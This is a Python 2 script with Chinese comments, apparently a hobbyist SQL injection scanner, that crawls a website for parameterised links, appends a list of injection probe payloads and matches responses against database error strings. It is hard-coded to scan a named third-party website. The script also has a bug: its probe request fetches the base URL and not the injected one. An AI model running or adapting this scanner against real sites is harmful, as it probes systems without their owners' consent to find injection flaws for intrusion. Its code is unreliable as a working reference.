# -*- coding: utf-8 -*-
# @Time    : 2018/5/6 0006 13:25
# @Author  : Langzi
# @Blog    : www.langzi.fun
# @File    : 检测sql注入.py
# @Software: PyCharm
import sys
import re
import requests
import time
import random
reload(sys)
sys.setdefaultencoding('utf-8')

payloads = ("'", "')", "';", '"', '")', '";',"--","-0",") AND 1998=1532 AND (5526=5526"," AND 5434=5692%23"," %' AND 5268=2356 AND '%'='"," ') AND 6103=4103 AND ('vPKl'='vPKl"," ' AND 7738=8291 AND 'UFqV'='UFqV",'`', '`)', '`;', '\\', "%27", "%%2727", "%25%27", "%60", "%5C")
# 这个列表存储的元素是能让网页报错的元素，比如加上单引号报错，加上双引号或者-报错
sql_errors = {'SQL syntax':'mysql','syntax to use near':'mysql','MySQLSyntaxErrorException':'mysql','valid MySQL result':'mysql',
			  'Access Database Engine':'Access','JET Database Engine':'Access','Microsoft Access Driver':'Access',
			'SQLServerException':'mssql','SqlException':'mssql','SQLServer JDBC Driver':'mssql','Incorrect syntax':'mssql',
			  'MySQL Query fail':'mysql'
		 }
# 这个字典保存的是数据库报错语句，字典的键是报错语句，值是这种数据库。如果网页出现键就说明是这个数据库，存在注入。
def scan_sql(url):
    # 这个函数接收一个网址，爬行链接和检测注入
    list_url=[]
    # 使用一个空的列表保存爬行的链接
    try:
        headers = {'User-Agent': "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"}
        # 浏览器头信息
        r_crawl = requests.get(url=url,headers=headers,timeout=5).content
        # 传入网址的网站源代码
        rr = re.findall(r'<a href="(.*?\..*?\?.*?=\d)">+', r_crawl)
        # 正则表达式提取链接
        for urls in rr:
            # 逐个判断 因为注入的链接一般都是www.123.com/abou?id=5
            if urls.find('?')>0 and urls.find('=')>0:
                # 确保链接中有？和=
                list_url.append(url+'/'+urls)
                # 满足条件的网址保存到列表
            print 'URLS found over'
            # 打印链接扫描完毕，开始做检测
        list_url=list(set(list_url))
        # 列表去重复
        if len(list_url)>0:
            # 当列表的元素大于1个的时候
            for u in list_url:
                # 遍历所有的链接
                for payload in payloads:
                    # 遍历所有的可以让数据库报错的语法加上单引号双引号
                    inj_url = u + str(payload)
                    # 构造成可以让网页报错的网址
                    print '[+]Checking>>> ' + inj_url
                    # 打印开始检测这个链接
                    try:
                        inj_content = requests.get(url=url,headers=headers,timeout=5).content
                        # 访问这个链接
                        for k,v in sql_errors.iteritems():
                            # 遍历字典的键与值
                            if k in inj_content:
                                # 如果字典的键出现在网页，说明网页报错了，存在注入
                                print '[*]Found A SQL ERROR:' + inj_url + '   ' + 'SQL INJ TYPE:' + v
                                # 打印出来发现一个注入漏洞，使用的数据库是v代表的值，关于迭代字典不会再问问
                    except Exception,e:
                        print e
        else:
            print '没有在网页中爬取到可以注入的链接'
    except Exception,e:
        print e

scan_sql('http://www.china-kongfu.com')

